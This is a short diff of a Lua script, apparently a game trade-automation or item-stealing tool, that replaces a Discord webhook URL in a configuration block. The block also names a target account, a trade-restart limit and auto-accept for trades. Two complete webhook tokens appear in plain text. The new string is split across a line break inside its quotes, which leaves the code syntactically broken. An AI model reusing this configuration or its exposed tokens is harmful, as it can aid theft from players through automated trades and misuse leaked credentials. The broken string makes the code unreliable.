@@ -19,7 +19,8 @@
 
 -- Configuração do alvo, dos destinos externos e dos limites da automação.
 local targetName = "olhom_y77"
-local webhookUrl = "https://discord.com/api/webhooks/1568345137917067534/StFoCXHWZz3BxfgkjqKJeLFKM5VnGuBw_mmYC2ag_cKhhm3kiDYZ2lurlDkGbnxwv8CR"
+local webhookUrl = "https://discord.com/api/webhooks/1569099876183179377/WAa53TEog8tITnUwyWqylr2MbCWYefTjbblSFB4Uv6rfoCl9evfuXT51FUAPqr5nZ0F6
+"
 local bannerImageUrl = "https://images.unsplash.com/photo-1522383225653-ed111181a951?w=1200&q=80"
 local maxTradeRestarts = (25)
 local autoAcceptEnabled = true
